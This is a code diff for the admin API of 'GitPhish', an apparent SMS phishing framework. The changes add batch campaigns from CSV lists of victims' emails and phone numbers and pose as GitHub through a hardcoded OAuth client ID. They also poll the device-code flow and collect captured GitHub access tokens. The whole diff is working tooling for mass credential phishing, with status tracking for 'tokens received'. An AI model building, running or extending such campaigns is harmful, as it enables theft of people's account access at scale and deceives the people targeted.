@@ -1,15 +1,18 @@
 """
 SMS Campaigns API for GitPhish Admin Interface.
-Provides REST endpoints for managing AWS SNS and Twilio SMS campaigns.
+Provides REST endpoints for managing AWS SNS and Twilio SMS campaigns with GitHub OAuth device flow.
 """
 
 import json
 import subprocess
 import tempfile
 import os
+import glob
 import logging
+import csv
+import io
 from datetime import datetime, timedelta
-from typing import Dict, Any, Optional
+from typing import Dict, Any, Optional, List, Tuple
 from flask import request, jsonify
 import boto3
 from twilio.rest import Client
@@ -42,10 +45,14 @@ class SMSCampaignsAPI:
                     if not data.get(field):
                         return jsonify({'success': False, 'error': f'{field} is required'}), 400
                 
-                platform = data['platform']  # 'github' or 'azure'
+                platform = data['platform']  # 'github'
                 provider = data['provider']  # 'twilio' or 'aws'
                 
-                # Build command based on platform and provider
+                # Handle CSV file upload for batch campaigns
+                if data.get('targetMethod') == 'file' and 'csvData' in data:
+                    return self._start_batch_campaign(data)
+                
+                # Build command for single target
                 cmd_args = self._build_campaign_command(data)
                 if not cmd_args:
                     return jsonify({'success': False, 'error': 'Invalid campaign configuration'}), 400
@@ -62,7 +69,9 @@ class SMSCampaignsAPI:
                     'status': 'starting',
                     'started': datetime.now().isoformat(),
                     'target_count': self._count_targets(data),
-                    'command': cmd_args
+                    'command': cmd_args,
+                    'sms_sent': 0,
+                    'tokens_captured': 0
                 }
                 
                 # Start the campaign subprocess
@@ -79,9 +88,8 @@ class SMSCampaignsAPI:
                         if data.get('awsRegion'):
                             env['AWS_DEFAULT_REGION'] = data['awsRegion']
                     
-                    # Get the correct working directory (where the python module is)
+                    # Get the correct working directory (project root)
                     current_file = os.path.abspath(__file__)
-                    # Navigate from api file to root
                     root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(current_file)))))
                     
                     process = subprocess.Popen(
@@ -89,7 +97,8 @@ class SMSCampaignsAPI:
                         stdout=subprocess.PIPE, 
                         stderr=subprocess.PIPE,
                         env=env,
-                        cwd=root_dir
+                        cwd=root_dir,
+                        text=True
                     )
                     self.active_campaigns[campaign_id]['process'] = process
                     self.active_campaigns[campaign_id]['status'] = 'running'
@@ -97,18 +106,6 @@ class SMSCampaignsAPI:
                     logger.info(f"Started SMS campaign {campaign_id} with command: {' '.join(cmd_args)}")
                     if data.get('provider') == 'aws':
                         logger.info(f"AWS credentials set for campaign {campaign_id}")
-                    
-                    # Log initial output for debugging
-                    try:
-                        stdout_data, stderr_data = process.communicate(timeout=5)
-                        if stdout_data:
-                            logger.info(f"Campaign {campaign_id} stdout: {stdout_data.decode()}")
-                        if stderr_data:
-                            logger.error(f"Campaign {campaign_id} stderr: {stderr_data.decode()}")
-                    except subprocess.TimeoutExpired:
-                        logger.info(f"Campaign {campaign_id} still running after 5 seconds")
-                    except Exception as comm_e:
-                        logger.error(f"Error getting campaign output: {str(comm_e)}")
                     
                 except Exception as e:
                     logger.error(f"Failed to start campaign process: {str(e)}")
@@ -131,27 +128,49 @@ class SMSCampaignsAPI:
             try:
                 # Update campaign statuses
                 for campaign_id, campaign in self.active_campaigns.items():
-                    # Check if campaign has captured tokens
-                    tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
-                    if tokens and campaign['status'] in ['running', 'completed']:
-                        campaign['status'] = 'token received'
-                        campaign['tokens_captured'] = len(tokens)
-                    
-                    # Check for expired campaigns (GitHub device codes expire after 15 minutes typically)
-                    if campaign['status'] == 'running' and self._is_campaign_expired(campaign):
-                        campaign['status'] = 'expired'
-                        campaign['finished'] = datetime.now().isoformat()
-                    
-                    # Check process status for running campaigns
-                    if 'process' in campaign and campaign['status'] == 'running':
-                        process = campaign['process']
-                        if process.poll() is not None:  # Process has finished
+                    # Handle batch campaigns differently
+                    if campaign.get('type') == 'batch':
+                        self._update_batch_campaign_status(campaign)
+                    else:
+                        # Regular campaign status update
+                        # Check if campaign has captured tokens
+                        tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
+                        campaign['tokens_captured'] = len(tokens) if tokens else 0
+                        
+                        # Count actual completed tokens (not pending)
+                        completed_tokens = [t for t in tokens if t.get('access_token') != 'pending']
+                        
+                        # Update SMS sent count based on target count (if SMS was sent successfully)
+                        if campaign['status'] == 'running' and campaign.get('sms_sent', 0) == 0:
+                            # If we have tokens (even pending), SMS was likely sent
                             if tokens:
-                                campaign['status'] = 'token received'
-                                campaign['tokens_captured'] = len(tokens)
-                            else:
-                                campaign['status'] = 'completed' if process.returncode == 0 else 'failed'
+                                campaign['sms_sent'] = campaign.get('target_count', 1)
+                        
+                        # Set status based on token completion
+                        if completed_tokens:
+                            campaign['status'] = 'token received'
+                            campaign['tokens_captured'] = len(completed_tokens)
+                        elif tokens and campaign['status'] in ['running', 'completed']:
+                            # Has pending tokens but no completed ones
+                            campaign['status'] = 'running'
+                        
+                        # Check for expired campaigns (GitHub device codes expire after 15 minutes typically)
+                        if campaign['status'] == 'running' and self._is_campaign_expired(campaign):
+                            campaign['status'] = 'expired'
                             campaign['finished'] = datetime.now().isoformat()
+                        
+                        # Check process status for running campaigns
+                        if 'process' in campaign and campaign['status'] == 'running':
+                            process = campaign['process']
+                            if process.poll() is not None:  # Process has finished
+                                if completed_tokens:
+                                    campaign['status'] = 'token received'
+                                    campaign['tokens_captured'] = len(completed_tokens)
+                                elif tokens:
+                                    campaign['status'] = 'waiting for auth'  # Has pending tokens, waiting for user
+                                else:
+                                    campaign['status'] = 'completed' if process.returncode == 0 else 'failed'
+                                campaign['finished'] = datetime.now().isoformat()
                 
                 # Create JSON-serializable copy without process objects
                 campaigns_json = []
@@ -190,7 +209,66 @@ class SMSCampaignsAPI:
                 logger.error(f"Error stopping campaign: {str(e)}")
                 return jsonify({'success': False, 'error': str(e)}), 500
 
-        @self.app.route('/api/sms-campaigns/test-twilio', methods=['POST'])
+        @self.app.route('/api/sms-campaigns/logs/<campaign_id>', methods=['GET'])
+        def get_campaign_logs(campaign_id):
+            """Get campaign logs and status."""
+            try:
+                if campaign_id not in self.active_campaigns:
+                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
+                
+                campaign = self.active_campaigns[campaign_id]
+                
+                # Get process output if available
+                output = ""
+                if 'process' in campaign:
+                    process = campaign['process']
+                    try:
+                        # Check if process is still running
+                        if process.poll() is None:
+                            # Process still running, try to get partial output without waiting
+                            output = "Campaign is running... Check back later for output."
+                        else:
+                            # Process finished, get all output
+                            stdout, stderr = process.communicate()
+                            if stdout:
+                                output += "STDOUT:\n" + stdout + "\n"
+                            if stderr:
+                                output += "STDERR:\n" + stderr + "\n"
+                            if not output:
+                                output = f"Process completed with exit code: {process.returncode}"
+                    except Exception as e:
+                        output = f"Error retrieving output: {str(e)}"
+                
+                # Check for tokens
+                tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
+                
+                # Calculate runtime
+                started = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
+                if campaign.get('finished'):
+                    ended = datetime.fromisoformat(campaign['finished'].replace('Z', '+00:00'))
+                else:
+                    ended = datetime.now()
+                
+                duration = ended - started
+                runtime = f"{int(duration.total_seconds())}s"
+                
+                return jsonify({
+                    'success': True,
+                    'output': output or 'No output yet...',
+                    'stats': {
+                        'status': campaign['status'],
+                        'sms_sent': campaign.get('sms_sent', 0),
+                        'tokens_captured': len(tokens),
+                        'runtime': runtime
+                    },
+                    'tokens': tokens
+                })
+                
+            except Exception as e:
+                logger.error(f"Error getting campaign logs: {str(e)}")
+                return jsonify({'success': False, 'error': str(e)}), 500
+
+        @self.app.route('/api/sms/test-twilio', methods=['POST'])
         def test_twilio():
             """Test Twilio configuration."""
             try:
@@ -214,7 +292,7 @@ class SMSCampaignsAPI:
                 logger.error(f"Error testing Twilio: {str(e)}")
                 return jsonify({'success': False, 'error': str(e)}), 500
 
-        @self.app.route('/api/sms-campaigns/test-aws', methods=['POST'])
+        @self.app.route('/api/sms/test-aws', methods=['POST'])
         def test_aws():
             """Test AWS SNS configuration."""
             try:
@@ -254,188 +332,17 @@ class SMSCampaignsAPI:
                 logger.error(f"Error testing AWS: {str(e)}")
                 return jsonify({'success': False, 'error': str(e)}), 500
 
-        @self.app.route('/api/sms-campaigns/list-aws-numbers', methods=['GET'])
-        def list_aws_numbers():
-            """List available AWS SMS numbers."""
-            try:
-                region = request.args.get('region', 'us-east-2')
-                pinpoint_client = boto3.client('pinpoint-sms-voice-v2', region_name=region)
-                
-                response = pinpoint_client.describe_pools(MaxResults=10)
-                pools = response.get("Pools", [])
-                
-                numbers_info = []
-                for pool in pools:
-                    pool_id = pool.get("PoolId")
-                    pool_info = {
-                        'id': pool_id,
-                        'status': pool.get('Status'),
-                        'type': pool.get('MessageType'),
-                        'numbers': []
-                    }
-                    
-                    try:
-                        originators = pinpoint_client.list_pool_origination_identities(
-                            PoolId=pool_id
-                        ).get("OriginationIdentities", [])
-                        
-                        for orig in originators:
-                            pool_info['numbers'].append({
-                                'identity': orig.get('Identity'),
-                                'country': orig.get('IsoCountryCode', 'Unknown')
-                            })
-                            
-                    except Exception as sub_e:
-                        logger.warning(f"Failed to fetch originators for pool {pool_id}: {sub_e}")
-                    
-                    numbers_info.append(pool_info)
-                
-                return jsonify({'success': True, 'numbers': numbers_info})
-                
-            except (BotoCoreError, ClientError) as e:
-                logger.error(f"Error listing AWS numbers: {str(e)}")
-                return jsonify({'success': False, 'error': str(e)}), 500
-            except Exception as e:
-                logger.error(f"Error listing AWS numbers: {str(e)}")
-                return jsonify({'success': False, 'error': str(e)}), 500
-
-        @self.app.route('/api/sms-campaigns/logs/<campaign_id>', methods=['GET'])
-        def get_campaign_logs(campaign_id):
-            """Get live logs for a campaign."""
-            try:
-                if campaign_id not in self.active_campaigns:
-                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
-                
-                campaign = self.active_campaigns[campaign_id]
-                
-                # Get output from subprocess if still running
-                output = ""
-                if 'process' in campaign:
-                    process = campaign['process']
-                    if process.poll() is None:  # Still running
-                        # Try to read available output without blocking
-                        try:
-                            stdout_data = process.stdout.read()
-                            stderr_data = process.stderr.read()
-                            if stdout_data:
-                                output += stdout_data.decode()
-                            if stderr_data:
-                                output += "\n--- STDERR ---\n" + stderr_data.decode()
-                        except:
-                            pass
-                    else:
-                        # Process finished, get all output
-                        stdout_data, stderr_data = process.communicate()
-                        if stdout_data:
-                            output += stdout_data.decode()
-                        if stderr_data:
-                            output += "\n--- STDERR ---\n" + stderr_data.decode()
-                
-                # Check for token files and parse them
-                tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
-                
-                # Calculate stats
-                stats = {
-                    'status': campaign.get('status', 'unknown'),
-                    'sms_sent': 1 if 'Text message successfully sent' in output else 0,
-                    'tokens_captured': len(tokens),
-                    'runtime': self._calculate_runtime(campaign.get('started'))
-                }
-                
-                return jsonify({
-                    'success': True,
-                    'output': output,
-                    'stats': stats,
-                    'tokens': tokens
-                })
-                
-            except Exception as e:
-                logger.error(f"Error getting campaign logs: {str(e)}")
-                return jsonify({'success': False, 'error': str(e)}), 500
-
-        @self.app.route('/api/sms-campaigns/logs/<campaign_id>/download', methods=['GET'])
-        def download_campaign_logs(campaign_id):
-            """Download campaign logs as text file."""
-            try:
-                if campaign_id not in self.active_campaigns:
-                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
-                
-                campaign = self.active_campaigns[campaign_id]
-                
-                # Get full output
-                output = f"Campaign ID: {campaign_id}\n"
-                output += f"Campaign Name: {campaign.get('name', 'Unknown')}\n"
-                output += f"Platform: {campaign.get('platform', 'Unknown')}\n"
-                output += f"Provider: {campaign.get('provider', 'Unknown')}\n"
-                output += f"Started: {campaign.get('started', 'Unknown')}\n"
-                output += f"Status: {campaign.get('status', 'Unknown')}\n"
-                output += "=" * 50 + "\n\n"
-                
-                # Get subprocess output
-                if 'process' in campaign:
-                    process = campaign['process']
-                    try:
-                        if process.poll() is None:
-                            stdout_data = process.stdout.read()
-                            stderr_data = process.stderr.read()
-                        else:
-                            stdout_data, stderr_data = process.communicate()
-                        
-                        if stdout_data:
-                            output += "STDOUT:\n" + stdout_data.decode() + "\n\n"
-                        if stderr_data:
-                            output += "STDERR:\n" + stderr_data.decode() + "\n\n"
-                    except:
-                        output += "Error reading process output\n"
-                
-                # Return as downloadable file
-                from flask import make_response
-                response = make_response(output)
-                response.headers['Content-Type'] = 'text/plain'
-                response.headers['Content-Disposition'] = f'attachment; filename=campaign-{campaign_id}-logs.txt'
-                return response
-                
-            except Exception as e:
-                logger.error(f"Error downloading campaign logs: {str(e)}")
-                return jsonify({'success': False, 'error': str(e)}), 500
-
-        @self.app.route('/api/sms-campaigns/tokens/<campaign_id>/download', methods=['GET'])
-        def download_campaign_tokens(campaign_id):
-            """Download captured tokens as JSON."""
-            try:
-                if campaign_id not in self.active_campaigns:
-                    return jsonify({'success': False, 'error': 'Campaign not found'}), 404
-                
-                campaign = self.active_campaigns[campaign_id]
-                tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
-                
-                return jsonify({
-                    'success': True,
-                    'campaign_id': campaign_id,
-                    'tokens': tokens,
-                    'exported_at': datetime.now().isoformat()
-                })
-                
-            except Exception as e:
-                logger.error(f"Error downloading campaign tokens: {str(e)}")
-                return jsonify({'success': False, 'error': str(e)}), 500
-
     def _build_campaign_command(self, data: Dict[str, Any]) -> Optional[list]:
         """Build the command line arguments for the campaign."""
         try:
             platform = data['platform']
             provider = data['provider']
             
-            # Base command - use python module
+            # Base command - use python module approach
             cmd = ['python', '-m', 'gitphish', 'sms']
             
-            # Determine the mode based on provider and platform
-            if provider == 'twilio' and platform == 'github':
-                cmd.append('twilio-github')
-            elif provider == 'aws' and platform == 'github':
-                cmd.append('aws-github')
-            else:
-                return None
+            # Add provider
+            cmd.append(provider)
             
             # Add target information
             if data.get('targetMethod') == 'single':
@@ -443,12 +350,6 @@ class SMSCampaignsAPI:
                     cmd.extend(['--email', data['targetEmail']])
                 if data.get('targetPhone'):
                     cmd.extend(['--phone', data['targetPhone']])
-            else:
-                # Handle file upload - for now, we'll create a temporary file
-                # In production, you'd want to handle file uploads properly
-                if data.get('targetFile'):
-                    # This would need proper file handling
-                    cmd.extend(['-f', '/tmp/targets.csv'])  # Placeholder
             
             # Add provider-specific arguments
             if provider == 'twilio':
@@ -462,15 +363,24 @@ class SMSCampaignsAPI:
                 if data.get('awsRegion'):
                     cmd.extend(['--region', data['awsRegion']])
             
-            # Add optional arguments
-            if data.get('scope'):
-                cmd.extend(['--scope', data['scope']])
+            # Add message template
+            if data.get('messageTemplate'):
+                cmd.extend(['--message', data['messageTemplate']])
             
+            # Add OAuth configuration if template contains OAuth variables
+            message_template = data.get('messageTemplate', '')
+            if any(var in message_template for var in ['{verification_uri}', '{user_code}', '{email}']):
+                # Add default OAuth configuration
+                cmd.extend(['--client-id', '178c6fc778ccc68e1d6a'])  # Default GitHub OAuth app
+                cmd.extend(['--org-name', 'GitHub'])  # Default organization
+            
+            # Add debug flag
             if data.get('debug'):
                 cmd.append('--debug')
             
-            if data.get('messageTemplate'):
-                cmd.extend(['--message', data['messageTemplate']])
+            # Add poll-tokens flag (default to true for campaigns to complete OAuth)
+            if data.get('pollTokens', True):
+                cmd.append('--poll-tokens')
             
             return cmd
             
@@ -484,82 +394,310 @@ class SMSCampaignsAPI:
             return 1 if data.get('targetEmail') else 0
         else:
             # For file uploads, we'd need to count lines in the file
-            # For now, return placeholder
-            return 0  # This would be implemented with proper file handling
+            return 0
 
     def _find_campaign_tokens(self, campaign_id: str, campaign_name: str) -> list:
         """Find and parse token files generated by the campaign."""
-        import glob
         tokens = []
         
         try:
-            # Look for token files in the current directory
-            # GitHub tokens: {email}.github_token.json
-            # Azure tokens: {email}.tokeninfo.json
+            # Get campaign start time to filter tokens
+            campaign = self.active_campaigns.get(campaign_id)
+            if not campaign:
+                return tokens
             
-            token_files = glob.glob('*.github_token.json') + glob.glob('*.tokeninfo.json')
+            campaign_start = datetime.fromisoformat(campaign['started'])
+            
+            # Look for token files in the data/tokens directory
+            os.makedirs("data/tokens", exist_ok=True)
+            token_files = glob.glob('data/tokens/github_token_*.json')
             
             for token_file in token_files:
                 try:
-                    with open(token_file, 'r') as f:
-                        token_data = json.load(f)
-                        
-                    # Extract email from filename
-                    email = token_file.replace('.github_token.json', '').replace('.tokeninfo.json', '')
+                    file_mtime = datetime.fromtimestamp(os.path.getmtime(token_file))
                     
-                    tokens.append({
-                        'email': email,
-                        'access_token': token_data.get('access_token', 'N/A'),
-                        'file': token_file,
-                        'captured_at': os.path.getmtime(token_file)
-                    })
+                    # Only include tokens created after this campaign started
+                    if file_mtime >= campaign_start:
+                        with open(token_file, 'r') as f:
+                            token_data = json.load(f)
+                            
+                            # Show first 20 characters + ... for security
+                            access_token = token_data.get('access_token', '')
+                            display_token = access_token[:20] + '...' if len(access_token) > 20 else access_token
+                            
+                            tokens.append({
+                                'email': token_data.get('email', ''),
+                                'access_token': display_token,
+                                'user_code': token_data.get('user_code', ''),
+                                'captured_at': os.path.getmtime(token_file)
+                            })
                 except Exception as e:
-                    logger.error(f"Error parsing token file {token_file}: {str(e)}")
-                    
+                    logger.error(f"Error reading token file {token_file}: {str(e)}")
+                    continue
+            
         except Exception as e:
-            logger.error(f"Error finding token files: {str(e)}")
+            logger.error(f"Error finding campaign tokens: {str(e)}")
         
         return tokens
 
-    def _calculate_runtime(self, started_time: str) -> str:
-        """Calculate how long the campaign has been running."""
-        if not started_time:
-            return 'Unknown'
-        
+    def _is_campaign_expired(self, campaign: Dict[str, Any]) -> bool:
+        """Check if a campaign has expired (GitHub device codes expire after ~15 minutes)."""
         try:
-            start_dt = datetime.fromisoformat(started_time.replace('Z', '+00:00'))
-            now_dt = datetime.now(start_dt.tzinfo) if start_dt.tzinfo else datetime.now()
+            started = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
+            now = datetime.now()
+            duration = now - started
+            return duration > timedelta(minutes=16)  # 16 minutes to be safe
+        except Exception:
+            return False
+
+    def _parse_csv_data(self, csv_data: str) -> List[Tuple[str, str]]:
+        """Parse CSV data and extract email,phone pairs."""
+        targets = []
+        try:
+            # Handle both CSV string data and file-like input
+            csv_file = io.StringIO(csv_data)
+            reader = csv.reader(csv_file)
             
-            delta = now_dt - start_dt
+            for row_num, row in enumerate(reader, 1):
+                if len(row) >= 2:
+                    email = row[0].strip()
+                    phone = row[1].strip()
+                    
+                    # Basic validation
+                    if email and phone:
+                        # Simple email validation
+                        if '@' in email and '.' in email.split('@')[-1]:
+                            # Simple phone validation (allow various formats)
+                            if phone.replace('+', '').replace('-', '').replace(' ', '').replace('(', '').replace(')', '').isdigit():
+                                targets.append((email, phone))
+                            else:
+                                logger.warning(f"Invalid phone format on row {row_num}: {phone}")
+                        else:
+                            logger.warning(f"Invalid email format on row {row_num}: {email}")
+                    else:
+                        logger.warning(f"Empty email or phone on row {row_num}")
+                else:
+                    logger.warning(f"Insufficient columns on row {row_num}")
+                    
+        except Exception as e:
+            logger.error(f"Error parsing CSV data: {str(e)}")
             
-            if delta.days > 0:
-                return f"{delta.days}d {delta.seconds // 3600}h"
-            elif delta.seconds >= 3600:
-                return f"{delta.seconds // 3600}h {(delta.seconds % 3600) // 60}m"
-            elif delta.seconds >= 60:
-                return f"{delta.seconds // 60}m {delta.seconds % 60}s"
+        return targets
+
+    def _start_batch_campaign(self, data: Dict[str, Any]):
+        """Start a batch campaign with multiple targets from CSV."""
+        try:
+            # Parse CSV data
+            csv_data = data.get('csvData', '')
+            targets = self._parse_csv_data(csv_data)
+            
+            if not targets:
+                return jsonify({'success': False, 'error': 'No valid targets found in CSV data'}), 400
+            
+            platform = data['platform']
+            provider = data['provider']
+            batch_name = data['name']
+            
+            # Generate batch campaign ID
+            batch_id = f"batch_{platform}_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+            
+            # Store batch campaign info
+            self.active_campaigns[batch_id] = {
+                'id': batch_id,
+                'platform': platform,
+                'provider': provider,
+                'name': batch_name,
+                'status': 'starting',
+                'started': datetime.now().isoformat(),
+                'target_count': len(targets),
+                'type': 'batch',
+                'individual_campaigns': [],
+                'sms_sent': 0,
+                'tokens_captured': 0
+            }
+            
+            # Create individual campaigns for each target
+            individual_campaigns = []
+            processes = []
+            
+            for i, (email, phone) in enumerate(targets):
+                # Create individual campaign data
+                individual_data = data.copy()
+                individual_data['targetEmail'] = email
+                individual_data['targetPhone'] = phone
+                individual_data['name'] = f"{batch_name}_target_{i+1}"
+                
+                # Generate individual campaign ID
+                individual_id = f"{batch_id}_target_{i+1}"
+                
+                # Build command for this target
+                cmd_args = self._build_campaign_command(individual_data)
+                if not cmd_args:
+                    logger.error(f"Failed to build command for target {i+1}: {email}")
+                    continue
+                
+                # Store individual campaign info
+                individual_campaign = {
+                    'id': individual_id,
+                    'batch_id': batch_id,
+                    'platform': platform,
+                    'provider': provider,
+                    'name': individual_data['name'],
+                    'target_email': email,
+                    'target_phone': phone,
+                    'status': 'starting',
+                    'started': datetime.now().isoformat(),
+                    'command': cmd_args,
+                    'sms_sent': 0,
+                    'tokens_captured': 0
+                }
+                
+                # Start the individual campaign subprocess
+                try:
+                    # Get current environment and add AWS credentials if needed
+                    env = os.environ.copy()
+                    if data.get('provider') == 'aws':
+                        if data.get('awsAccessKeyId'):
+                            env['AWS_ACCESS_KEY_ID'] = data['awsAccessKeyId']
+                        if data.get('awsSecretAccessKey'):
+                            env['AWS_SECRET_ACCESS_KEY'] = data['awsSecretAccessKey']
+                        if data.get('awsSessionToken') and data['awsSessionToken'].strip():
+                            env['AWS_SESSION_TOKEN'] = data['awsSessionToken']
+                        if data.get('awsRegion'):
+                            env['AWS_DEFAULT_REGION'] = data['awsRegion']
+                    
+                    # Get the correct working directory (project root)
+                    current_file = os.path.abspath(__file__)
+                    root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(current_file)))))
+                    
+                    process = subprocess.Popen(
+                        cmd_args, 
+                        stdout=subprocess.PIPE, 
+                        stderr=subprocess.PIPE,
+                        env=env,
+                        cwd=root_dir,
+                        text=True
+                    )
+                    
+                    individual_campaign['process'] = process
+                    individual_campaign['status'] = 'running'
+                    processes.append(process)
+                    
+                    logger.info(f"Started individual campaign {individual_id} for {email} with command: {' '.join(cmd_args)}")
+                    
+                except Exception as e:
+                    logger.error(f"Failed to start individual campaign for {email}: {str(e)}")
+                    individual_campaign['status'] = 'failed'
+                    individual_campaign['error'] = str(e)
+                
+                individual_campaigns.append(individual_campaign)
+                self.active_campaigns[individual_id] = individual_campaign
+            
+            # Update batch campaign with individual campaign references
+            self.active_campaigns[batch_id]['individual_campaigns'] = [c['id'] for c in individual_campaigns]
+            self.active_campaigns[batch_id]['status'] = 'running'
+            
+            logger.info(f"Started batch campaign {batch_id} with {len(individual_campaigns)} individual campaigns")
+            
+            return jsonify({
+                'success': True, 
+                'campaign_id': batch_id,
+                'batch_id': batch_id,
+                'individual_count': len(individual_campaigns),
+                'message': f'Batch campaign started with {len(individual_campaigns)} parallel campaigns'
+            })
+            
+        except Exception as e:
+            logger.error(f"Error starting batch campaign: {str(e)}")
+            return jsonify({'success': False, 'error': str(e)}), 500
+
+    def _update_batch_campaign_status(self, batch_campaign: Dict[str, Any]):
+        """Update status for a batch campaign by aggregating individual campaign statuses."""
+        try:
+            individual_ids = batch_campaign.get('individual_campaigns', [])
+            if not individual_ids:
+                return
+            
+            # Aggregate status from individual campaigns
+            running_count = 0
+            completed_count = 0
+            failed_count = 0
+            token_received_count = 0
+            total_sms_sent = 0
+            total_tokens_captured = 0
+            
+            for individual_id in individual_ids:
+                individual = self.active_campaigns.get(individual_id)
+                if not individual:
+                    continue
+                
+                # Update individual campaign status first
+                tokens = self._find_campaign_tokens(individual_id, individual.get('name', ''))
+                individual['tokens_captured'] = len(tokens) if tokens else 0
+                
+                completed_tokens = [t for t in tokens if t.get('access_token') != 'pending']
+                
+                # Update SMS sent count
+                if individual['status'] == 'running' and individual.get('sms_sent', 0) == 0:
+                    if tokens:
+                        individual['sms_sent'] = 1
+                
+                # Update status based on tokens
+                if completed_tokens:
+                    individual['status'] = 'token received'
+                    individual['tokens_captured'] = len(completed_tokens)
+                elif tokens and individual['status'] in ['running', 'completed']:
+                    individual['status'] = 'running'
+                
+                # Check if expired
+                if individual['status'] == 'running' and self._is_campaign_expired(individual):
+                    individual['status'] = 'expired'
+                    individual['finished'] = datetime.now().isoformat()
+                
+                # Check process status
+                if 'process' in individual and individual['status'] == 'running':
+                    process = individual['process']
+                    if process.poll() is not None:  # Process has finished
+                        if completed_tokens:
+                            individual['status'] = 'token received'
+                            individual['tokens_captured'] = len(completed_tokens)
+                        elif tokens:
+                            individual['status'] = 'waiting for auth'
+                        else:
+                            individual['status'] = 'completed' if process.returncode == 0 else 'failed'
+                        individual['finished'] = datetime.now().isoformat()
+                
+                # Aggregate counts
+                status = individual['status']
+                if status == 'running':
+                    running_count += 1
+                elif status in ['completed', 'waiting for auth']:
+                    completed_count += 1
+                elif status == 'failed':
+                    failed_count += 1
+                elif status == 'token received':
+                    token_received_count += 1
+                
+                total_sms_sent += individual.get('sms_sent', 0)
+                total_tokens_captured += individual.get('tokens_captured', 0)
+            
+            # Update batch campaign status
+            batch_campaign['sms_sent'] = total_sms_sent
+            batch_campaign['tokens_captured'] = total_tokens_captured
+            
+            # Determine overall batch status
+            total_campaigns = len(individual_ids)
+            if token_received_count > 0:
+                batch_campaign['status'] = f"tokens received ({token_received_count}/{total_campaigns})"
+            elif running_count > 0:
+                batch_campaign['status'] = f"running ({running_count}/{total_campaigns})"
+            elif completed_count == total_campaigns:
+                batch_campaign['status'] = 'all completed'
+            elif failed_count == total_campaigns:
+                batch_campaign['status'] = 'all failed'
             else:
-                return f"{delta.seconds}s"
+                batch_campaign['status'] = f"mixed ({completed_count} completed, {failed_count} failed)"
                 
         except Exception as e:
-            logger.error(f"Error calculating runtime: {str(e)}")
-            return 'Error'
-
-    def _is_campaign_expired(self, campaign: Dict[str, Any]) -> bool:
-        """Check if a campaign has expired (GitHub device codes expire after 15 minutes)."""
-        if not campaign.get('started'):
-            return False
-        
-        try:
-            start_dt = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
-            now_dt = datetime.now(start_dt.tzinfo) if start_dt.tzinfo else datetime.now()
-            
-            # GitHub device codes typically expire after 15 minutes
-            # Add a buffer for processing time
-            expiry_duration = timedelta(minutes=16)
-            
-            return now_dt - start_dt > expiry_duration
-            
-        except Exception as e:
-            logger.error(f"Error checking campaign expiry: {str(e)}")
-            return False
+            logger.error(f"Error updating batch campaign status: {str(e)}")
+            batch_campaign['status'] = 'error'
